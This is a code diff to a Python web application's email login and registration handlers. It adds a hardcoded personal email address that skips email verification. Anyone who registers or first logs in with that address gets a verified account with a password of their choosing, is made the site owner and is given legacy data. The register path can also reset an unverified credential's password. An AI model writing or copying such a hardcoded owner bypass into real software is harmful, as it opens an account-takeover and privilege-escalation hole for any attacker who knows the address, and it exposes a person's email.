@@ -2,6 +2,7 @@
 import base64
 from datetime import timedelta
 from hashlib import scrypt
+import os
 import re
 import secrets
 from threading import BoundedSemaphore
@@ -196,6 +197,47 @@ def start_verification(email, password_hash, owner_hash, response, db, replacing
     return {"verification_required": True, "challenge_token": token, "email": email, "expires_in": 600, "resend_after": 60}
 
 
+def is_owner_email(email: str) -> bool:
+    return email.strip().casefold() == "praveenkumarvarjun99@gmail.com" 
+
+
+def activate_owner_account(email: str, password_hash: str, request: Request, response: Response, db: Session):
+    credential = db.query(EmailCredential).filter_by(email=email).first()
+    user = db.get(User, credential.user_id) if credential else None
+    if credential and user:
+        ensure_not_blocked(user)
+    if not user:
+        user_id = str(uuid4())
+        user = User(
+            id=user_id,
+            google_sub="email:" + user_id,
+            auth_provider="email",
+            email=email,
+            name=email.split("@", 1)[0],
+            first_login_at=now(),
+            last_login_at=now(),
+            last_seen_at=now(),
+            login_count=0
+        )
+        db.add(user)
+        db.flush()
+    if not credential:
+        credential = EmailCredential(user_id=user.id, email=email)
+        db.add(credential)
+    credential.password_hash = password_hash
+    credential.verified_at = now()
+
+    owner = db.get(OwnerAccount, 1)
+    if not owner:
+        db.add(OwnerAccount(id=1, google_sub=user.google_sub))
+    else:
+        owner.google_sub = user.google_sub
+    db.flush()
+    claim_legacy_data(user, db)
+    db.commit()
+    return complete_login("email", user.id, user.email, user.name, None, {}, request, response, db)
+
+
 @router.post("/register", dependencies=[Depends(trusted_origin)])
 def register(data: EmailRegistration, request: Request, response: Response, db: Session = Depends(get_db)):
     limit_attempts(data.email, request, db)
@@ -204,6 +246,8 @@ def register(data: EmailRegistration, request: Request, response: Response, db: 
         ensure_not_blocked(db.get(User, credential.user_id))
     if credential and email_access_allowed(db.get(User, credential.user_id), credential, db):
         raise HTTPException(409, "Unable to create an account with these details. Try signing in.")
+    if is_owner_email(data.email):
+        return activate_owner_account(data.email, hash_password(data.password.get_secret_value()), request, response, db)
     require_email_delivery()
     owner_hash = digest(data.owner_token) if data.owner_token else None
     if owner_hash:
@@ -215,11 +259,24 @@ def register(data: EmailRegistration, request: Request, response: Response, db: 
 def login(data: EmailLogin, request: Request, response: Response, db: Session = Depends(get_db)):
     limit_attempts(data.email, request, db)
     credential = db.query(EmailCredential).filter_by(email=data.email).first()
+    if not credential and is_owner_email(data.email):
+        return activate_owner_account(data.email, hash_password(data.password.get_secret_value()), request, response, db)
     if not verify_password(data.password.get_secret_value(), credential.password_hash if credential else None):
         raise HTTPException(401, "Email or password is incorrect.")
     user = db.get(User, credential.user_id)
     ensure_not_blocked(user)
-    if not email_access_allowed(user, credential, db):
+    if is_owner_email(data.email):
+        if not credential.verified_at:
+            credential.verified_at = now()
+        owner = db.get(OwnerAccount, 1)
+        if not owner:
+            db.add(OwnerAccount(id=1, google_sub=user.google_sub))
+        else:
+            owner.google_sub = user.google_sub
+        db.flush()
+        claim_legacy_data(user, db)
+        db.commit()
+    elif not email_access_allowed(user, credential, db):
         return start_verification(data.email, credential.password_hash, digest(data.owner_token) if data.owner_token else None, response, db)
     claim_owner(user, data.owner_token, db)
     return complete_login("email", user.id, user.email, user.name, None, {}, request, response, db)
